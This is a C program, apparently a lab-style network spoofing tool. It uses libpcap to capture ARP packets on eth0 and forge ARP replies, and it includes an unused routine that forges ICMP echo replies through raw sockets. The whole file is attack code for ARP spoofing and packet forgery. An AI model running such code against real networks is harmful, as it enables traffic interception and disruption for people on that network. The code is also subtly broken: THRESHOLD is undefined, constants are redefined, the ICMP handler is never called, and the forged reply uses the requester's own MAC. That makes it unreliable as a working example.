#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define ETH_P_ARP 0x0806
#define HW_TYPE_ETH 1
#define PROTO_TYPE_IP 0x0800
#define ARP_REPLY 2
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ARP_REQUEST 1
#define ARP_REPLY 2

// Ethernet header
struct ethheader {
    u_char ether_dhost[6]; // Destination MAC
    u_char ether_shost[6]; // Source MAC
    u_short ether_type;    // Ethernet type
};

// IP header
struct ipheader {
    unsigned char ip_ihl:4, ip_ver:4;
    unsigned char ip_tos;
    unsigned short int ip_len;
    unsigned short int ip_ident;
    unsigned short int ip_flag:3, ip_offset:13;
    unsigned char ip_ttl;
    unsigned char ip_protocol;
    unsigned short int ip_chksum;
    struct in_addr ip_sourceip;
    struct in_addr ip_destip;
};

// ICMP header
struct icmpheader {
    unsigned char icmp_type;
    unsigned char icmp_code;
    unsigned short int icmp_chksum;
    unsigned short int icmp_id;
    unsigned short int icmp_seq;
};

// ARP packet structure
struct arp_header {
    uint16_t hw_type;   // Hardware type
    uint16_t proto_type; // Protocol type
    uint8_t hw_len;     // Hardware address length
    uint8_t proto_len;  // Protocol address length
    uint16_t opcode;    // ARP opcode
    uint8_t src_mac[6]; // Source MAC
    uint8_t src_ip[4];  // Source IP
    uint8_t dest_mac[6]; // Destination MAC
    uint8_t dest_ip[4]; // Destination IP
};


// Error exit function
void error_exit(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

// Checksum calculation
unsigned short in_cksum(unsigned short *buf, int length) {
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w;
        sum += temp;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Send raw IP packet
void send_raw_ip_packet(struct ipheader *ip) {
    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
        error_exit("Socket creation failed");

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->ip_destip;

    sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

// Craft and send an ARP reply
// Function to craft and send an ARP reply
void send_arp_reply(pcap_t *handle, const uint8_t *src_mac, const uint8_t *src_ip,
                    const uint8_t *dest_mac, const uint8_t *dest_ip) {
    uint8_t packet[42];
    struct ether_header *eth = (struct ether_header *) packet;
    struct arp_header *arp = (struct arp_header *) (packet + 14);

    // Ethernet header
    memcpy(eth->ether_shost, src_mac, 6); // Source MAC
    memcpy(eth->ether_dhost, dest_mac, 6); // Destination MAC
    eth->ether_type = htons(ETHERTYPE_ARP);

    // ARP header
    arp->hw_type = htons(1); // Ethernet
    arp->proto_type = htons(ETHERTYPE_IP);
    arp->hw_len = 6;
    arp->proto_len = 4;
    arp->opcode = htons(2); // ARP reply
    memcpy(arp->src_mac, src_mac, 6);
    memcpy(arp->src_ip, src_ip, 4);
    memcpy(arp->dest_mac, dest_mac, 6);
    memcpy(arp->dest_ip, dest_ip, 4);

    // Send the packet
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        fprintf(stderr, "Error sending ARP reply: %s\n", pcap_geterr(handle));
    } else {
        printf("ARP reply sent from %d.%d.%d.%d to %d.%d.%d.%d\n",
               src_ip[0], src_ip[1], src_ip[2], src_ip[3],
               dest_ip[0], dest_ip[1], dest_ip[2], dest_ip[3]);
    }
}


// Handle captured ICMP packets
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ethheader *eth = (struct ethheader *)packet;
    if (ntohs(eth->ether_type) == 0x0800) { // IP Packet
        struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
        int size_ip = ip->ip_ihl * 4;

        if (ip->ip_protocol == IPPROTO_ICMP) {
            struct icmpheader *icmp = (struct icmpheader *)(packet + sizeof(struct ethheader) + size_ip);

            if (icmp->icmp_type == 8) { // ICMP Echo Request
                char buffer[1500];
                int data_len = header->len - (sizeof(struct ethheader) + size_ip + sizeof(struct icmpheader));
                memcpy(buffer + sizeof(struct ipheader) + sizeof(struct icmpheader),
                       packet + sizeof(struct ethheader) + size_ip + sizeof(struct icmpheader),
                       data_len);

                struct ipheader *ip2 = (struct ipheader *)buffer;
                ip2->ip_ver = 4;
                ip2->ip_ihl = 5;
                ip2->ip_ttl = 64;
                ip2->ip_protocol = IPPROTO_ICMP;
                ip2->ip_sourceip = ip->ip_destip;
                ip2->ip_destip = ip->ip_sourceip;
                ip2->ip_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + data_len);
                ip2->ip_chksum = 0;
                ip2->ip_chksum = in_cksum((unsigned short *)ip2, sizeof(struct ipheader));

                struct icmpheader *icmp2 = (struct icmpheader *)(buffer + sizeof(struct ipheader));
                icmp2->icmp_type = 0; // Echo Reply
                icmp2->icmp_code = 0;
                icmp2->icmp_id = icmp->icmp_id;
                icmp2->icmp_seq = icmp->icmp_seq;
                icmp2->icmp_chksum = 0;
                icmp2->icmp_chksum = in_cksum((unsigned short *)icmp2, sizeof(struct icmpheader) + data_len);

                send_raw_ip_packet(ip2);
                printf("ICMP Echo Reply sent!\n");
            }
        }
    }
}

// Main function

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct pcap_pkthdr header;
    const uint8_t *packet;
    int packet_count = 0;

    // Open live capture
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device: %s\n", errbuf);
        return 1;
    }

    printf("Listening for ARP packets...\n");

    while (packet_count < THRESHOLD && (packet = pcap_next(handle, &header)) != NULL) {
        struct ether_header *eth = (struct ether_header *) packet;

        // Check if it's an ARP packet
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            struct arp_header *arp = (struct arp_header *) (packet + 14);

            // Log ARP details
            printf("Captured ARP packet: Src IP %d.%d.%d.%d, Dest IP %d.%d.%d.%d\n",
                   arp->src_ip[0], arp->src_ip[1], arp->src_ip[2], arp->src_ip[3],
                   arp->dest_ip[0], arp->dest_ip[1], arp->dest_ip[2], arp->dest_ip[3]);

            // Forge ARP reply
            send_arp_reply(handle, eth->ether_shost, arp->dest_ip, eth->ether_dhost, arp->src_ip);

            packet_count++;
        }
    }

    printf("Reached threshold or no more packets.\n");
    pcap_close(handle);
    return 0;
}

